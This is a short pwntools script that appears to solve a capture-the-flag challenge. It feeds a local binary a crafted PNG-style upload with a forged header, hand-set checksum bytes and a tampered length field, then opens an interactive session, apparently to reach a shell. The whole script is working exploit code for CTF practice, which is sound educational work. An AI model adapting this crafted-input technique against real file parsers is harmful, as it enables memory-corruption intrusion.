from pwn import * 
context.arch='amd64'
context.log_level='debug'
# context.terminal = ['tmux', 'splitw', '-h']

cn = process("./chal")
# cn = remote("mc.ax", 31412)

bps = [0x0000000000401A6B, 0x000000000401A3F, 0x00000000004015F9, 0x00000000004015E1]
bps = [0x000000000401A6B]
cmd = "" 
for bp in bps:
    cmd += "b * {}\n".format(bp)
print(cmd)
gdb.attach(cn, cmd)

leng = 0x29
cn.sendlineafter("How large is your file?\n\n", str(leng))
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

data[11] = 0xd

data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

data[0x24] = 0x30 - 1 - 8

# wow, this causes `updata_crc` to return 0x1818
# data[0x25] = 0x18
# data[0x26] = 0x0b

data[0x25] = 0x22
data[0x26] = 0xfa

# data[0x28] = 0x1

cn.sendafter("please send your image here:\n\n", bytes(data))
cn.sendlineafter("do you want to invert the colors?\n", "y")

cn.interactive()
